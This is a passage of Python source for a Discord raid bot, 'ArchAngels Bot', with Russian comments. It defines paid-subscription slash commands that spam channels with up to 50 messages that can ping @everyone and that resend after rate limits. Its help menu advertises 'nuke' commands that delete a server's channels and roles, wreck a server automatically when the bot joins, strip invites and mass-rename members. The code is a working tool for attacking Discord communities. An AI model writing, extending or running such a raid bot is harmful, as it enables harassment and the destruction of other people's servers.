                # Сохраняем команду чтобы выполнить после выбора — не делаем, просто просим выбрать
                return
            guild = bot.get_guild(gid)
            if not guild:
                await message.channel.send("Активный сервер недоступен. Выбери другой через `!guilds`.")
                active_guild.pop(message.author.id, None)
                return
            await run_dm_command(message, guild, content)
            return

    # ── Обычная обработка на сервере ────────────────────────
    if message.guild and is_guild_blocked(message.guild.id):
        return  # Сервер заблокирован — игнорируем всё
    if message.content.strip() == "!" and is_whitelisted(message.author.id):
        ctx = await bot.get_context(message)
        await help_cmd(ctx)
        return
    await bot.process_commands(message)
    log.info("Команда от %s (%s) на сервере %s: %s", message.author, message.author.id, message.guild, message.content)


@bot.event
async def on_ready():
    load_whitelist()
    load_blocked_guilds()
    # Удаляем все slash команды
    bot.tree.clear_commands(guild=None)

    # Добавляем /sp как user-installable команду
    @bot.tree.command(name="sp", description="Спам сообщением")
    @app_commands.describe(count="Количество раз", text="Текст сообщения")
    @app_commands.allowed_installs(guilds=True, users=True)
    @app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
    @app_commands.checks.cooldown(1, 300, key=lambda i: (i.user.id, i.channel_id))
    async def sp(interaction: discord.Interaction, count: int, text: str):
        await interaction.response.defer(ephemeral=True)
        if not is_whitelisted(interaction.user.id):
            await interaction.followup.send("❌ У тебя нет подписки. За покупкой в ЛС Discord: **davaidkatt**", ephemeral=True)
            return
        if count > 50:
            await interaction.followup.send("Максимум 50 сообщений.", ephemeral=True)
            return
        mentions = discord.AllowedMentions(everyone=True, roles=True, users=True)
        channel = interaction.channel
        if channel is None:
            await interaction.followup.send("❌ Не удалось получить канал.", ephemeral=True)
            return
        await interaction.followup.send(f"✅ Запускаю спам: {count} сообщений.", ephemeral=True)
        for _ in range(count):
            try:
                await interaction.followup.send(text, ephemeral=False, allowed_mentions=mentions)
                await asyncio.sleep(0.5)
            except discord.HTTPException as e:
                if e.status == 429:
                    await asyncio.sleep(e.retry_after + 0.5)
                    await interaction.followup.send(text, ephemeral=False, allowed_mentions=mentions)
            except Exception:
                pass

    @bot.tree.command(name="spkd", description="Спам с задержкой между сообщениями")
    @app_commands.describe(delay="Задержка в секундах (0 = без задержки)", count="Количество сообщений (макс 50)", text="Текст сообщения")
    @app_commands.allowed_installs(guilds=True, users=True)
    @app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
    async def spkd(interaction: discord.Interaction, delay: int, count: int, text: str):
        await interaction.response.defer(ephemeral=True)
        if not is_whitelisted(interaction.user.id):
            await interaction.followup.send("❌ У тебя нет подписки. За покупкой в ЛС Discord: **davaidkatt**", ephemeral=True)
            return
        if count > 50:
            await interaction.followup.send("Максимум 50 сообщений.", ephemeral=True)
            return
        if delay < 0:
            await interaction.followup.send("Задержка не может быть отрицательной.", ephemeral=True)
            return
        mentions = discord.AllowedMentions(everyone=True, roles=True, users=True)
        channel = interaction.channel
        if channel is None:
            await interaction.followup.send("❌ Не удалось получить канал.", ephemeral=True)
            return
        await interaction.followup.send(f"✅ Запускаю спам: {count} сообщений, задержка {delay}с.", ephemeral=True)
        for _ in range(count):
            try:
                await interaction.followup.send(text, ephemeral=False, allowed_mentions=mentions)
            except discord.HTTPException as e:
                if e.status == 429:
                    await asyncio.sleep(e.retry_after + 0.5)
                    await interaction.followup.send(text, ephemeral=False, allowed_mentions=mentions)
            except Exception:
                pass
            if delay > 0:
                await asyncio.sleep(delay)
            else:
                await asyncio.sleep(0.5)
    @bot.tree.command(name="help", description="Список всех команд бота")
    @app_commands.allowed_installs(guilds=True, users=True)
    @app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
    async def slash_help(interaction: discord.Interaction):
        embed = discord.Embed(title="ArchAngels Bot", description="Все команды бота.", color=discord.Color.red())
        embed.add_field(
            name="💥 Краш  `!` / `/`",
            value=(
                "`!nuke [текст]` — удалить каналы/роли, создать новые и заспамить\n"
                "`!stop` — остановить краш\n"
                "`!cleanup` — удалить все каналы, создать один чистый\n"
                "`!auto_nuke on/off/info` — авто-краш при входе бота\n"
                "`!addch [кол-во] [название]` — создать каналы"
            ),
            inline=False
        )
        embed.add_field(
            name="⚙️ Управление  `!`",
            value=(
                "`!rename [название]` — переименовать все каналы\n"
                "`!nsfw_all` — включить NSFW во всех каналах\n"
                "`!unnsfw_all` — выключить NSFW\n"
                "`!invs_delete` — удалить все приглашения\n"
                "`!nicks_all [ник]` — сменить ник всем участникам"
            ),
            inline=False
        )
        embed.add_field(
            name="📨 Спам  `/`",
            value=(
                "`/sp [кол-во] [текст]` — спам (макс 50, кд 5 мин на канал)\n"
                "`/spkd [задержка] [кол-во] [текст]` — спам с задержкой в сек"
            ),
            inline=False
        )
        embed.add_field(
            name="🔧 Утилиты  `!`",
            value=(
                "`!webhooks` — список вебхуков сервера\n"
                "`!ip [адрес]` — информация об IP\n"
                "`!inv` — ссылка для добавления бота"
            ),
            inline=False
        )
        embed.add_field(
            name="👥 Whitelist  `!`",
            value=(
                "`!wl_add [id]` — добавить в whitelist\n"
                "`!wl_remove [id]` — убрать из whitelist\n"
                "`!wl_list` — показать whitelist"
            ),
            inline=False
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)

    await bot.tree.sync()
    for guild in bot.guilds:
        bot.tree.clear_commands(guild=guild)
        await bot.tree.sync(guild=guild)
    print(f"Бот запущен как {bot.user}")


if __name__ == "__main__":
    bot.run(config.TOKEN)
